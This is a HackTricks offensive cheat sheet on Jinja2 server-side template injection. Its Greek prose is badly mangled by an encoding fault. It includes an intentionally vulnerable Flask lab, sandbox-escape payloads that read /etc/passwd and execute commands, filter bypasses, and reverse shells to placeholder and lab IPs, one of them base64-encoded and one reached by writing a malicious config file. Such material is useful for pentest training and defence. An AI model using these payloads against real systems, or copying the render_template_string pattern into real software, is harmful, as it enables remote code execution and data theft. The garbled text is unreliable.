# Jinja2 SSTI

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Î•ÏÎ³Î±ÏƒÏ„Î®ÏÎ¹Î¿**
```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/")
def home():
if request.args.get('c'):
return render_template_string(request.args.get('c'))
else:
return "Hello, send someting inside the param 'c'!"

if __name__ == "__main__":
app.run()
```
## **Î”Î¹Î¬Ï†Î¿ÏÎ±**

### **Î”Î®Î»Ï‰ÏƒÎ· Î•Î½Ï„Î¿Ï€Î¹ÏƒÎ¼Î¿Ï Î£Ï†Î±Î»Î¼Î¬Ï„Ï‰Î½**

Î•Î¬Î½ Î· Î•Ï€Î­ÎºÏ„Î±ÏƒÎ· Î•Î½Ï„Î¿Ï€Î¹ÏƒÎ¼Î¿Ï Î£Ï†Î±Î»Î¼Î¬Ï„Ï‰Î½ ÎµÎ¯Î½Î±Î¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î·, Î¼Î¹Î± ÎµÏ„Î¹ÎºÎ­Ï„Î± `debug` Î¸Î± ÎµÎ¯Î½Î±Î¹ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î· Î³Î¹Î± Î½Î± ÎµÎºÏ„Ï…Ï€ÏÏƒÎµÎ¹ Ï„Î¿ Ï„ÏÎ­Ï‡Î¿Î½ Ï€Î»Î±Î¯ÏƒÎ¹Î¿ ÎºÎ±Î¸ÏÏ‚ ÎºÎ±Î¹ Ï„Î¿Ï…Ï‚ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î¿Ï…Ï‚ Ï†Î¯Î»Ï„ÏÎ¿Ï…Ï‚ ÎºÎ±Î¹ Î´Î¿ÎºÎ¹Î¼Î­Ï‚. Î‘Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Ï‡ÏÎ®ÏƒÎ¹Î¼Î¿ Î³Î¹Î± Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î¹ ÎµÎ¯Î½Î±Î¹ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î¿ Ï€ÏÎ¿Ï‚ Ï‡ÏÎ®ÏƒÎ· ÏƒÏ„Î¿ Ï€ÏÏŒÏ„Ï…Ï€Î¿ Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± ÏÏ…Î¸Î¼Î¯ÏƒÎµÏ„Îµ Î­Î½Î±Î½ ÎµÎ½Ï„Î¿Ï€Î¹ÏƒÏ„Î® ÏƒÏ†Î±Î»Î¼Î¬Ï„Ï‰Î½.
```python
<pre>

{% raw %}
{% debug %}
{% endraw %}






</pre>
```
### **Î•ÎºÏ„ÏÏ€Ï‰ÏƒÎ· ÏŒÎ»Ï‰Î½ Ï„Ï‰Î½ Î¼ÎµÏ„Î±Î²Î»Î·Ï„ÏÎ½ ÏÏÎ¸Î¼Î¹ÏƒÎ·Ï‚**
```python
{{ config }} #In these object you can find all the configured env variables


{% raw %}
{% for key, value in config.items() %}
<dt>{{ key|e }}</dt>
<dd>{{ value|e }}</dd>
{% endfor %}
{% endraw %}




```
## **Jinja Injection**

Î ÏÏÏ„Î± Î±Ï€' ÏŒÎ»Î±, ÏƒÎµ Î¼Î¹Î± Jinja injection Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± **Î²ÏÎµÎ¯Ï„Îµ Î­Î½Î±Î½ Ï„ÏÏŒÏ€Î¿ Î½Î± Î¾ÎµÏ†ÏÎ³ÎµÏ„Îµ Î±Ï€ÏŒ Ï„Î¿ sandbox** ÎºÎ±Î¹ Î½Î± Î±Î½Î±ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î· ÎºÎ±Î½Î¿Î½Î¹ÎºÎ® ÏÎ¿Î® ÎµÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚ python. Î“Î¹Î± Î½Î± Ï„Î¿ ÎºÎ¬Î½ÎµÏ„Îµ Î±Ï…Ï„ÏŒ, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± **ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î±** Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ **Î±Ï€ÏŒ** Ï„Î¿ **Î¼Î· sandboxed Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½ Î±Î»Î»Î¬ ÎµÎ¯Î½Î±Î¹ Ï€ÏÎ¿ÏƒÎ²Î¬ÏƒÎ¹Î¼Î± Î±Ï€ÏŒ Ï„Î¿ sandbox**.

### Accessing Global Objects

Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, ÏƒÏ„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± `render_template("hello.html", username=username, email=email)` Ï„Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î± username ÎºÎ±Î¹ email **Ï€ÏÎ¿Î­ÏÏ‡Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ Î¼Î· sandboxed python env** ÎºÎ±Î¹ Î¸Î± ÎµÎ¯Î½Î±Î¹ **Ï€ÏÎ¿ÏƒÎ²Î¬ÏƒÎ¹Î¼Î±** Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ **sandboxed env.**\
Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ Î¬Î»Î»Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î± Ï€Î¿Ï… Î¸Î± ÎµÎ¯Î½Î±Î¹ **Ï€Î¬Î½Ï„Î± Ï€ÏÎ¿ÏƒÎ²Î¬ÏƒÎ¹Î¼Î± Î±Ï€ÏŒ Ï„Î¿ sandboxed env**, Î±Ï…Ï„Î¬ ÎµÎ¯Î½Î±Î¹:
```
[]
''
()
dict
config
request
```
### Î‘Î½Î¬ÎºÏ„Î·ÏƒÎ· \<class 'object'>

Î¤ÏŒÏ„Îµ, Î±Ï€ÏŒ Î±Ï…Ï„Î¬ Ï„Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï†Ï„Î¬ÏƒÎ¿Ï…Î¼Îµ ÏƒÏ„Î·Î½ ÎºÎ»Î¬ÏƒÎ·: **`<class 'object'>`** Ï€ÏÎ¿ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎ¿Ï…Î¼Îµ Î½Î± **Î±Î½Î±ÎºÏ„Î®ÏƒÎ¿Ï…Î¼Îµ** Ï„Î¹Ï‚ ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ **ÎºÎ»Î¬ÏƒÎµÎ¹Ï‚**. Î‘Ï…Ï„ÏŒ ÏƒÏ…Î¼Î²Î±Î¯Î½ÎµÎ¹ ÎµÏ€ÎµÎ¹Î´Î® Î±Ï€ÏŒ Î±Ï…Ï„ÏŒ Ï„Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± ÎºÎ±Î»Î­ÏƒÎ¿Ï…Î¼Îµ Ï„Î· Î¼Î­Î¸Î¿Î´Î¿ **`__subclasses__`** ÎºÎ±Î¹ Î½Î± **Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ ÎºÎ»Î¬ÏƒÎµÎ¹Ï‚ Î±Ï€ÏŒ Ï„Î¿ Î¼Î· sandboxed** Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½ python.

Î“Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î±Ï…Ï„Î® Ï„Î·Î½ **ÎºÎ»Î¬ÏƒÎ· Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Î¿Ï…**, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± **Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ ÎºÎ»Î¬ÏƒÎ·Ï‚** ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÎµÎ¯Ï„Îµ ÏƒÎµ **`__base__`**, **`__mro__()[-1]`** Î® `.`**`mro()[-1]`**. ÎšÎ±Î¹ Î¼ÎµÏ„Î¬, **Î¼ÎµÏ„Î¬** Ï„Î·Î½ ÎµÏ€Î¯Ï„ÎµÏ…Î¾Î· Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ **ÎºÎ»Î¬ÏƒÎ·Ï‚ Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Î¿Ï…** ÎºÎ±Î»Î¿ÏÎ¼Îµ **`__subclasses__()`**.

Î”ÎµÎ¯Ï„Îµ Î±Ï…Ï„Î¬ Ï„Î± Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î±:
```python
# To access a class object
[].__class__
''.__class__
()["__class__"] # You can also access attributes like this
request["__class__"]
config.__class__
dict #It's already a class

# From a class to access the class "object".
## "dict" used as example from the previous list:
dict.__base__
dict["__base__"]
dict.mro()[-1]
dict.__mro__[-1]
(dict|attr("__mro__"))[-1]
(dict|attr("\x5f\x5fmro\x5f\x5f"))[-1]

# From the "object" class call __subclasses__()
{{ dict.__base__.__subclasses__() }}
{{ dict.mro()[-1].__subclasses__() }}
{{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}

{% raw %}
{% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}

# Other examples using these ways
{{ ().__class__.__base__.__subclasses__() }}
{{ [].__class__.__mro__[-1].__subclasses__() }}
{{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
{{ request.__class__.mro()[-1].__subclasses__() }}
{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
{% endraw %}




# Not sure if this will work, but I saw it somewhere
{{ [].class.base.subclasses() }}
{{ ''.class.mro()[1].subclasses() }}
```
### RCE Escaping

**Î‘Ï†Î¿Ï Î±Î½Î±ÎºÏ„Î®ÏƒÎ±Î¼Îµ** `<class 'object'>` ÎºÎ±Î¹ ÎºÎ±Î»Î­ÏƒÎ±Î¼Îµ `__subclasses__`, Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Ï„ÏÏÎ± Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î¼Îµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ ÎºÎ»Î¬ÏƒÎµÎ¹Ï‚ Î³Î¹Î± Î½Î± Î´Î¹Î±Î²Î¬ÏƒÎ¿Ï…Î¼Îµ ÎºÎ±Î¹ Î½Î± Î³ÏÎ¬ÏˆÎ¿Ï…Î¼Îµ Î±ÏÏ‡ÎµÎ¯Î± ÎºÎ±Î¹ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¿Ï…Î¼Îµ ÎºÏÎ´Î¹ÎºÎ±.

Î— ÎºÎ»Î®ÏƒÎ· ÏƒÏ„Î¿ `__subclasses__` Î¼Î±Ï‚ Î­Ï‡ÎµÎ¹ Î´ÏÏƒÎµÎ¹ Ï„Î·Î½ ÎµÏ…ÎºÎ±Î¹ÏÎ¯Î± Î½Î± **Î­Ï‡Î¿Ï…Î¼Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÎµÎºÎ±Ï„Î¿Î½Ï„Î¬Î´ÎµÏ‚ Î½Î­ÎµÏ‚ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚**, Î¸Î± ÎµÎ¯Î¼Î±ÏƒÏ„Îµ ÎµÏ…Ï‡Î±ÏÎ¹ÏƒÏ„Î·Î¼Î­Î½Î¿Î¹ Î±Ï€Î»Î¬ Î¼Îµ Ï„Î·Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î·Î½ **ÎºÎ»Î¬ÏƒÎ· Î±ÏÏ‡ÎµÎ¯Î¿Ï…** Î³Î¹Î± **Î±Î½Î¬Î³Î½Ï‰ÏƒÎ·/Î³ÏÎ±Ï†Î® Î±ÏÏ‡ÎµÎ¯Ï‰Î½** Î® Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ ÎºÎ»Î¬ÏƒÎ· Î¼Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î¼Î¹Î± ÎºÎ»Î¬ÏƒÎ· Ï€Î¿Ï… **ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎµÎ½Ï„Î¿Î»ÏÎ½** (ÏŒÏ€Ï‰Ï‚ Ï„Î¿ `os`).

**Î”Î¹Î±Î²Î¬ÏƒÏ„Îµ/Î“ÏÎ¬ÏˆÏ„Îµ Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î¿ Î±ÏÏ‡ÎµÎ¯Î¿**
```python
# ''.__class__.__mro__[1].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```
**RCE**
```python
# The class 396 is the class <class 'subprocess.Popen'>
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}

# Without '{{' and '}}'

<div data-gb-custom-block data-tag="if" data-0='application' data-1='][' data-2='][' data-3='__globals__' data-4='][' data-5='__builtins__' data-6='__import__' data-7='](' data-8='os' data-9='popen' data-10='](' data-11='id' data-12='read' data-13=']() == ' data-14='chiv'> a </div>

# Calling os.popen without guessing the index of the class
{% raw %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}

## Passing the cmd line in a GET param
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{% endraw %}


## Passing the cmd line ?cmd=id, Without " and '
{{ dict.mro()[-1].__subclasses__()[276](request.args.cmd,shell=True,stdout=-1).communicate()[0].strip() }}

```
Î“Î¹Î± Î½Î± Î¼Î¬Î¸ÎµÏ„Îµ Î³Î¹Î± **Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ ÎºÎ»Î¬ÏƒÎµÎ¹Ï‚** Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î³Î¹Î± Î½Î± **Î¾ÎµÏ†ÏÎ³ÎµÏ„Îµ**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ**:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Î Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· Ï†Î¯Î»Ï„ÏÏ‰Î½

#### ÎšÎ¿Î¹Î½Î­Ï‚ Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÎ¹Ï‚

Î‘Ï…Ï„Î­Ï‚ Î¿Î¹ Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÎ¹Ï‚ Î¸Î± Î¼Î±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎ¿Ï…Î½ Î½Î± **Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·** ÏƒÏ„Î± **Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÎ¬** Ï„Ï‰Î½ Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Ï‰Î½ **Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î¼Îµ ÎºÎ¬Ï€Î¿Î¹Î¿Ï…Ï‚ Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÎµÏ‚**.\
ÎˆÏ‡Î¿Ï…Î¼Îµ Î®Î´Î· Î´ÎµÎ¹ Î¼ÎµÏÎ¹ÎºÎ­Ï‚ Î±Ï€ÏŒ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÎ¹Ï‚ ÏƒÏ„Î± Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± Ï„Î¿Ï… Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î¿Ï…, Î±Î»Î»Î¬ Î±Ï‚ Ï„Î¹Ï‚ ÏƒÏ…Î½Î¿ÏˆÎ¯ÏƒÎ¿Ï…Î¼Îµ ÎµÎ´Ï:
```bash
# Without quotes, _, [, ]
## Basic ones
request.__class__
request["__class__"]
request['\x5f\x5fclass\x5f\x5f']
request|attr("__class__")
request|attr(["_"*2, "class", "_"*2]|join) # Join trick

## Using request object options
request|attr(request.headers.c) #Send a header like "c: __class__" (any trick using get params can be used with headers also)
request|attr(request.args.c) #Send a param like "?c=__class__
request|attr(request.query_string[2:16].decode() #Send a param like "?c=__class__
request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join) # Join list to string
http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_ #Formatting the string from get params

## Lists without "[" and "]"
http://localhost:5000/?c={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_

# Using with

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}
{% endraw %}




```
* [**Î•Ï€Î¹ÏƒÏ„ÏÎ­ÏˆÏ„Îµ ÎµÎ´Ï Î³Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ ÎµÏ€Î¹Î»Î¿Î³Î­Ï‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÎµ Î­Î½Î± Ï€Î±Î³ÎºÏŒÏƒÎ¼Î¹Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿**](jinja2-ssti.md#accessing-global-objects)
* [**Î•Ï€Î¹ÏƒÏ„ÏÎ­ÏˆÏ„Îµ ÎµÎ´Ï Î³Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ ÎµÏ€Î¹Î»Î¿Î³Î­Ï‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÏ„Î·Î½ ÎºÎ»Î¬ÏƒÎ· Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Î¿Ï…**](jinja2-ssti.md#recovering-less-than-class-object-greater-than)
* [**Î”Î¹Î±Î²Î¬ÏƒÏ„Îµ Î±Ï…Ï„ÏŒ Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ RCE Ï‡Ï‰ÏÎ¯Ï‚ Ï„Î·Î½ ÎºÎ»Î¬ÏƒÎ· Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Î¿Ï…**](jinja2-ssti.md#jinja-injection-without-less-than-class-object-greater-than)

**Î‘Ï€Î¿Ï†Ï…Î³Î® ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ HTML**

Î‘Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®, Ï„Î¿ Flask ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¹ÎµÎ¯ ÏŒÎ»Î± Ï„Î± Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± Ï€ÏÏŒÏ„Ï…Ï€Î¿ Î³Î¹Î± Î»ÏŒÎ³Î¿Ï…Ï‚ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚:
```python
{{'<script>alert(1);</script>'}}
#will be
&lt;script&gt;alert(1);&lt;/script&gt;
```
**ÎŸ Ï†Î¯Î»Ï„ÏÎ¿ `safe`** Î¼Î±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ¹ÏƒÎ¬Î³Î¿Ï…Î¼Îµ JavaScript ÎºÎ±Î¹ HTML ÏƒÏ„Î· ÏƒÎµÎ»Î¯Î´Î± **Ï‡Ï‰ÏÎ¯Ï‚** Î½Î± ÎµÎ¯Î½Î±Î¹ **ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿ ÏƒÎµ HTML**, ÏŒÏ€Ï‰Ï‚ Î±Ï…Ï„ÏŒ:
```python
{{'<script>alert(1);</script>'|safe}}
#will be
<script>alert(1);</script>
```
**RCE Î¼Îµ Ï„Î· ÏƒÏ…Î³Î³ÏÎ±Ï†Î® ÎµÎ½ÏŒÏ‚ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿Ï… Î±ÏÏ‡ÎµÎ¯Î¿Ï… ÏÏ…Î¸Î¼Î¯ÏƒÎµÏ‰Î½.**
```python
# evil config
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}

# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
```
## Î§Ï‰ÏÎ¯Ï‚ Î±ÏÎºÎµÏ„Î¿ÏÏ‚ Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÎµÏ‚

Î§Ï‰ÏÎ¯Ï‚ **`{{`** **`.`** **`[`** **`]`** **`}}`** **`_`**
```python
{% raw %}
{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%}{%print(a)%}{%endwith%}
{% endraw %}




```
## Jinja Injection Ï‡Ï‰ÏÎ¯Ï‚ **\<class 'object'>**

Î‘Ï€ÏŒ Ï„Î± [**Ï€Î±Î³ÎºÏŒÏƒÎ¼Î¹Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î±**](jinja2-ssti.md#accessing-global-objects) Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î­Î½Î±Ï‚ Î¬Î»Î»Î¿Ï‚ Ï„ÏÏŒÏ€Î¿Ï‚ Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ **RCE Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î±Ï…Ï„Î® Ï„Î·Î½ ÎºÎ»Î¬ÏƒÎ·.**\
Î‘Î½ ÎºÎ±Ï„Î±Ï†Î­ÏÎµÏ„Îµ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ **ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·** Î±Ï€ÏŒ Î±Ï…Ï„Î¬ Ï„Î± Ï€Î±Î³ÎºÏŒÏƒÎ¼Î¹Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î±, Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ **`__globals__.__builtins__`** ÎºÎ±Î¹ Î±Ï€ÏŒ ÎµÎºÎµÎ¯ Ï„Î¿ **RCE** ÎµÎ¯Î½Î±Î¹ Ï€Î¿Î»Ï **Î±Ï€Î»ÏŒ**.

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î²ÏÎµÎ¯Ï„Îµ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚** Î±Ï€ÏŒ Ï„Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î± **`request`**, **`config`** ÎºÎ±Î¹ Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ **Î¬Î»Î»Î¿** ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Î½ **Ï€Î±Î³ÎºÏŒÏƒÎ¼Î¹Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿** Ï€Î¿Ï… Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î¼Îµ:
```bash
{{ request.__class__.__dict__ }}
- application
- _load_form_data
- on_json_loading_failed

{{ config.__class__.__dict__ }}
- __init__
- from_envvar
- from_pyfile
- from_object
- from_file
- from_json
- from_mapping
- get_namespace
- __repr__

# You can iterate through children objects to find more
```
